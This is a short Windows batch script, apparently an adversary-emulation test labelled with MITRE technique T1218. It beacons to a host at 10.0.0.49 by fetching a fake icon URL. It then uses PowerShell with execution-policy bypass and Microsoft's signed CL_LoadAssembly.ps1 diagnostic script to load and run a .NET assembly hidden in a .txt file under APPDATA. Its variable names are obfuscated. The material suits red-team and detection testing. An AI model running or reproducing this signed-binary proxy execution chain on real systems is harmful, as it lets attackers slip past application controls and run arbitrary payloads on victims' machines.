@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\8658\47f5b7b4
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8658-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=surfshark.txt
SET ewjmdkff=8658
SET jhrtp=%APPDATA%\!pudaazx!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_start>> "!jhrtp!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_complete>> "!jhrtp!" 2>nul

echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_start>> "!jhrtp!" 2>nul
cd /d "C:\Windows\diagnostics\system\Audio" 2>nul
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_complete>> "!jhrtp!" 2>nul

echo [%DATE% %TIME%][DEBUG][!hlbnp!]: assembly_load_start>> "!jhrtp!" 2>nul
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath '!pjkcpgw!\\!syjfr!';[Program]::Dale()"
SET rdtf=0
SET mkgt=
if !errorlevel! equ 0 (SET rdtf=1) else (SET rdtf=0&SET mkgt=assembly_load_failed)

SET rfrq=%DATE%
SET vhkb=%TIME%
SET rfrq=!rfrq:~-10!
SET rfrq=!rfrq:/=-!
SET vhkb=!vhkb:.=:!
echo [!rfrq! !vhkb!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!rdtf!:!mkgt!>> "!jhrtp!" 2>nul
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: assembly_load_complete errorlevel=!errorlevel!>> "!jhrtp!" 2>nul
ENDLOCAL